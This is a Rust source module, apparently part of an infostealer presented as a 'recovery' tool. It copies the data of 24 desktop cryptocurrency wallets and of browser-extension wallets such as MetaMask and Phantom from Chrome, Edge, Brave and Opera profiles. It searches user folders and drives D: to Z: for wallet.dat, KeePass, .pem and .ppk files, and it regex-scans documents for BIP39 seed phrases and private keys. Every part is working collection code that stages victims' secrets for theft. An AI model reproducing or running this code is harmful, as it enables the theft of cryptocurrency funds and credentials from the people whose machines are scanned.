use crate::recovery::{
    context::RecoveryContext,
    fs::{copy_dir_limited, copy_file, sanitize_label},
    output::write_json_artifact,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use regex::Regex;
use serde::Serialize;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use walkdir::WalkDir;

pub fn wallet_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(CryptoWalletTask::new(ctx)),
        Arc::new(ExtensionWalletTask::new(ctx)),
        Arc::new(WalletPatternSearchTask::new(ctx)),
        Arc::new(SeedPhraseDiscoveryTask::new(ctx)),
        wallet_inventory_task(ctx),
    ]
}

pub fn wallet_inventory_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(WalletInventoryTask::new(ctx))
}

pub struct WalletInventoryTask {
    specs: Vec<WalletSummarySpec>,
}

struct WalletSummarySpec {
    label: &'static str,
    sources: Vec<PathBuf>,
    sample_limit: usize,
}

impl WalletInventoryTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        let specs = wallet_specs(ctx)
            .into_iter()
            .map(|(label, sources, _, _)| WalletSummarySpec {
                label,
                sources,
                sample_limit: 64,
            })
            .collect();
        Self { specs }
    }
}

#[derive(Serialize)]
struct WalletInventorySummary {
    inventories: Vec<WalletInventoryRecord>,
}

#[derive(Serialize)]
struct WalletInventoryRecord {
    label: String,
    roots: Vec<String>,
    exists: bool,
    file_count: usize,
    total_bytes: u64,
    samples: Vec<WalletFile>,
}

#[derive(Serialize)]
struct WalletFile {
    relative: String,
    size: u64,
}

async fn collect_wallet_files(
    root: &Path,
    limit: usize,
) -> Result<(Vec<WalletFile>, usize, u64), RecoveryError> {
    let mut stack = vec![root.to_path_buf()];
    let mut samples = Vec::new();
    let mut count = 0;
    let mut total_bytes = 0;

    while let Some(path) = stack.pop() {
        let mut dir = match fs::read_dir(&path).await {
            Ok(dir) => dir,
            Err(err) => return Err(RecoveryError::Io(err)),
        };

        while let Some(entry) = dir.next_entry().await? {
            let metadata = entry.metadata().await?;
            if metadata.is_dir() {
                stack.push(entry.path());
            } else if metadata.is_file() {
                count += 1;
                total_bytes += metadata.len();
                if samples.len() < limit {
                    let relative = entry
                        .path()
                        .strip_prefix(root)
                        .map(|p| p.display().to_string())
                        .unwrap_or_else(|_| entry.path().display().to_string());
                    samples.push(WalletFile {
                        relative,
                        size: metadata.len(),
                    });
                }
            }
        }
    }

    Ok((samples, count, total_bytes))
}

#[async_trait]
impl RecoveryTask for WalletInventoryTask {
    fn label(&self) -> String {
        "Wallet Inventory".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut inventories = Vec::new();

        for spec in &self.specs {
            let mut record = WalletInventoryRecord {
                label: spec.label.to_string(),
                roots:
                    spec.sources
                        .iter()
                        .map(|path| path.display().to_string())
                        .collect(),
                exists: false,
                file_count: 0,
                total_bytes: 0,
                samples: Vec::new(),
            };

            for root in &spec.sources {
                if !root.exists() {
                    continue;
                }

                record.exists = true;
                if let Ok((samples, count, bytes)) =
                    collect_wallet_files(root, spec.sample_limit).await
                {
                    record.samples.extend(samples);
                    record.file_count += count;
                    record.total_bytes += bytes;
                }
            }

            inventories.push(record);
        }

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "wallet-inventory.json",
            &WalletInventorySummary { inventories },
        )
        .await?;

        Ok(vec![artifact])
    }
}

struct CryptoWalletTask {
    specs: Vec<WalletSpec>,
}

impl CryptoWalletTask {
    fn new(ctx: &RecoveryContext) -> Self {
        Self {
            specs: build_wallet_specs(ctx),
        }
    }
}

#[async_trait]
impl RecoveryTask for CryptoWalletTask {
    fn label(&self) -> String {
        "Desktop Wallets".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        for spec in &self.specs {
            let dest_root = wallet_output_dir(ctx, spec.label).await?;
            for dir in &spec.directories {
                if fs::metadata(dir).await.is_ok() {
                    copy_dir_limited(dir, &dest_root, &spec.label, &mut artifacts, usize::MAX, 0)
                        .await?;
                }
            }
            for file in &spec.files {
                copy_file(&spec.label, file, &dest_root, &mut artifacts).await?;
            }
        }

        Ok(artifacts)
    }
}

struct WalletSpec {
    label: &'static str,
    directories: Vec<PathBuf>,
    files: Vec<PathBuf>,
}

impl WalletSpec {
    fn new(label: &'static str) -> Self {
        Self {
            label,
            directories: Vec::new(),
            files: Vec::new(),
        }
    }
}

pub fn wallet_specs(
    ctx: &RecoveryContext,
) -> Vec<(&'static str, Vec<PathBuf>, Vec<PathBuf>, &'static str)> {
    let roaming = &ctx.roaming_data_dir;
    let home = &ctx.home_dir;

    vec![
        ("Ethereum", vec![roaming.join("Ethereum").join("keystore")], vec![], "Ethereum"),
        ("Electrum", vec![roaming.join("Electrum").join("wallets")], vec![], "Electrum"),
        ("Atomic", vec![roaming.join("atomic").join("Local Storage").join("leveldb")], vec![], "Atomic"),
        ("Exodus", vec![], vec![roaming.join("Exodus").join("exodus.wallet")], "Exodus"),
        ("Jaxx", vec![roaming.join("com.liberty.jaxx").join("IndexedDB").join("file__0.indexeddb.leveldb")], vec![], "Jaxx"),
        ("Coinomi", vec![roaming.join("Coinomi").join("Coinomi").join("wallets")], vec![], "Coinomi"),
        ("Guarda", vec![roaming.join("Guarda").join("Local Storage").join("leveldb")], vec![], "Guarda"),
        ("Zephyr", vec![roaming.join("Zephyr").join("wallets")], vec![], "Zephyr"),
        ("Armory", vec![roaming.join("Armory")], vec![], "Armory"),
        ("Bytecoin", vec![roaming.join("bytecoin")], vec![], "Bytecoin"),
        ("Zcash", vec![roaming.join("Zcash")], vec![], "Zcash"),
        ("Dash", vec![roaming.join("DashCore")], vec![], "Dash"),
        ("Monero", vec![home.join("Documents").join("Monero").join("wallets")], vec![], "Monero"),
        ("Bitcoin", vec![roaming.join("Bitcoin")], vec![], "Bitcoin"),
        ("Litecoin", vec![roaming.join("Litecoin")], vec![], "Litecoin"),
        ("Dogecoin", vec![roaming.join("Dogecoin")], vec![], "Dogecoin"),
        ("Raven", vec![roaming.join("Raven")], vec![], "Raven"),
        ("MultiBit", vec![roaming.join("MultiBitHD")], vec![], "MultiBit"),
        ("Wasabi", vec![roaming.join("WalletWasabi").join("Client").join("Wallets")], vec![], "Wasabi"),
        ("Daedalus", vec![roaming.join("Daedalus Mainnet").join("wallets")], vec![], "Daedalus"),
        ("Yoroi", vec![roaming.join("Yoroi")], vec![], "Yoroi"),
        ("Terra", vec![roaming.join("Terra Station")], vec![], "Terra"),
        ("Sparrow", vec![roaming.join("Sparrow").join("wallets")], vec![], "Sparrow"),
        ("Binance", vec![roaming.join("Binance")], vec![], "Binance"),
    ]
}

fn build_wallet_specs(ctx: &RecoveryContext) -> Vec<WalletSpec> {
    wallet_specs(ctx)
        .into_iter()
        .map(|(label, dirs, files, _)| {
            let mut spec = WalletSpec::new(label);
            spec.directories = dirs;
            spec.files = files;
            spec
        })
        .collect()
}

struct ExtensionWalletTask {
    local_app_data: PathBuf,
}

impl ExtensionWalletTask {
    fn new(ctx: &RecoveryContext) -> Self {
        Self {
            local_app_data: ctx.local_data_dir.clone(),
        }
    }
}

const EXTENSION_IDS: &[(&str, &str)] = &[
    ("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
    ("Binance", "fhbohimaelbohpjbbldcngcnapndodjp"),
    ("Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
    ("Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec"),
    ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
    ("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
    ("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"),
    ("Pontem", "phkbamefinggmakgklpkljjmgibnpglj"),
    ("Sui", "opcgpfmipidbgpenhmajoajpbobppdil"),
    ("Martian", "efbglgofoippbgcjepnhiblaibcnclgk"),
    ("Petra", "ejjladinnckdgjemekebdpeokbikhfci"),
    ("BitKeep", "jiidiaalihmmhddjgbnbhljjczhozign"),
    ("Solflare", "bhhhlbepdkbapadjdnnojkbgioiodbic"),
    ("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"),
];

const BROWSER_PATHS: &[(&str, &str)] = &[
    ("Chrome", "Google\\Chrome\\User Data"),
    ("Edge", "Microsoft\\Edge\\User Data"),
    ("Brave", "BraveSoftware\\Brave-Browser\\User Data"),
    ("Opera", "Opera Software\\Opera Stable"),
    ("OperaGX", "Opera Software\\Opera GX Stable"),
];

#[async_trait]
impl RecoveryTask for ExtensionWalletTask {
    fn label(&self) -> String {
        "Extension Wallets".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();

        for (browser_name, relative_path) in BROWSER_PATHS {
            let user_data = self.local_app_data.join(relative_path);
            if !user_data.exists() {
                continue;
            }

            let mut profiles = vec![user_data.join("Default")];
            if let Ok(mut entries) = fs::read_dir(&user_data).await {
                while let Ok(Some(entry)) = entries.next_entry().await {
                    if let Ok(name) = entry.file_name().into_string() {
                        if name.starts_with("Profile") {
                            profiles.push(entry.path());
                        }
                    }
                }
            }

            for profile in profiles {
                let extensions_dir = profile.join("Local Extension Settings");
                if !extensions_dir.exists() {
                    continue;
                }

                for (wallet_name, ext_id) in EXTENSION_IDS {
                    let ext_path = extensions_dir.join(ext_id);
                    if ext_path.exists() {
                        let label = format!("Ext_{}_{}", browser_name, wallet_name);
                        let dest_root = wallet_output_dir(ctx, &label).await?;
                        
                        copy_dir_limited(&ext_path, &dest_root, &label, &mut artifacts, usize::MAX, 0).await?;
                    }
                }
            }
        }

        Ok(artifacts)
    }
}

struct WalletPatternSearchTask {
    user_roots: Vec<PathBuf>,
    drive_roots: Vec<PathBuf>,
}

impl WalletPatternSearchTask {
    fn new(ctx: &RecoveryContext) -> Self {
        let mut user_roots = vec![
            ctx.home_dir.join("Desktop"),
            ctx.home_dir.join("Documents"),
            ctx.home_dir.join("Downloads"),
            ctx.local_data_dir.clone(),
            ctx.roaming_data_dir.clone(),
        ];
        user_roots.retain(|p| p.exists());

        let mut drive_roots = Vec::new();
        for b in b'D'..=b'Z' {
            let drive = format!("{}:\\", b as char);
            let path = PathBuf::from(&drive);
            if path.exists() {
                drive_roots.push(path);
            }
        }

        Self {
            user_roots,
            drive_roots,
        }
    }
}

const TARGET_PATTERNS: &[&str] = &[
    "wallet.dat",
    "default_wallet",
    "UTC--",
    ".kdbx",
    ".key",
    ".pem",
    ".ppk",
    "wallet.json",
    ".wallet",
];

const IGNORED_DIRS: &[&str] = &[
    "Windows",
    "Program Files",
    "Program Files (x86)",
    "ProgramData",
    "$Recycle.Bin",
    "System Volume Information",
    "OneDriveTemp",
    "node_modules",
    ".git",
    "target",
    "npm-cache",
    ".cargo",
    ".rustup",
];

#[async_trait]
impl RecoveryTask for WalletPatternSearchTask {
    fn label(&self) -> String {
        "Wallet Discovery".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let dest_root = wallet_output_dir(ctx, "Discovery").await?;
        let mut handles = Vec::new();

        for root in &self.user_roots {
            let root = root.clone();
            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 10)));
        }

        for root in &self.drive_roots {
            let root = root.clone();
            handles.push(tokio::task::spawn_blocking(move || perform_scan(root, 4)));
        }

        for handle in handles {
            if let Ok(files) = handle.await {
                for file in files {
                    let _ = copy_file("Discovery", &file, &dest_root, &mut artifacts).await;
                }
            }
        }

        Ok(artifacts)
    }
}

fn perform_scan(root: PathBuf, depth: usize) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let walker = WalkDir::new(root)
        .max_depth(depth)
        .follow_links(false)
        .into_iter()
        .filter_entry(|e| !is_ignored(e));

    for entry in walker.filter_map(Result::ok) {
        if !entry.file_type().is_file() {
            continue;
        }
        let name = entry.file_name().to_string_lossy();
        if TARGET_PATTERNS.iter().any(|&p| name.contains(p)) {
            if entry.metadata().map(|m| m.len()).unwrap_or(0) < 50 * 1024 * 1024 {
                found.push(entry.path().to_path_buf());
            }
        }
    }
    found
}

fn is_ignored(entry: &walkdir::DirEntry) -> bool {
    entry
        .file_name()
        .to_str()
        .map(|s| IGNORED_DIRS.contains(&s))
        .unwrap_or(false)
}

struct SeedPhraseDiscoveryTask {
    roots: Vec<PathBuf>,
}

impl SeedPhraseDiscoveryTask {
    fn new(ctx: &RecoveryContext) -> Self {
        let mut roots = vec![
            ctx.home_dir.join("Desktop"),
            ctx.home_dir.join("Documents"),
            ctx.home_dir.join("Downloads"),
        ];
        roots.retain(|p| p.exists());
        Self { roots }
    }
}

#[async_trait]
impl RecoveryTask for SeedPhraseDiscoveryTask {
    fn label(&self) -> String {
        "Seed & Key Discovery".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let dest_root = wallet_output_dir(ctx, "Seeds").await?;

        let bip39_regex = Regex::new(r"(?i)\b([a-z]{3,}\s+){11,23}[a-z]{3,}\b").unwrap();
        let priv_key_regex = Regex::new(r"\b([a-fA-F0-9]{64})|([5KL][1-9A-HJ-NP-Za-km-z]{50,51})\b").unwrap();
        
        let target_names = ["seed", "mnemonic", "phrase", "backup", "crypto", "wallet", "secret", "private", "key", "pass"];
        let target_exts = [".txt", ".doc", ".docx", ".pdf", ".rtf", ".md", ".json", ".log"];

        for root in &self.roots {
            let walker = WalkDir::new(root)
                .max_depth(5)
                .follow_links(false)
                .into_iter()
                .filter_entry(|e| !is_ignored(e));

            for entry in walker.filter_map(Result::ok) {
                if !entry.file_type().is_file() {
                    continue;
                }

                let path = entry.path();
                let name_lower = path
                    .file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .to_lowercase();

                let has_target_ext = target_exts.iter().any(|&ext| name_lower.ends_with(ext));
                if !has_target_ext {
                     continue;
                }
                
                let mut should_grab = false;

                if target_names.iter().any(|&s| name_lower.contains(s)) {
                    should_grab = true;
                }

                if !should_grab && (name_lower.ends_with(".txt") || name_lower.ends_with(".md") || name_lower.ends_with(".log") || name_lower.ends_with(".json")) {
                    if let Ok(meta) = fs::metadata(path).await {
                        if meta.len() < 1024 * 50 {
                            if let Ok(content) = fs::read_to_string(path).await {
                                if bip39_regex.is_match(&content) || priv_key_regex.is_match(&content) {
                                    should_grab = true;
                                }
                            }
                        }
                    }
                }

                if should_grab {
                    let _ = copy_file("Seeds", path, &dest_root, &mut artifacts).await;
                }
            }
        }

        Ok(artifacts)
    }
}

async fn wallet_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("Wallets")
        .join(sanitize_label(label));
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}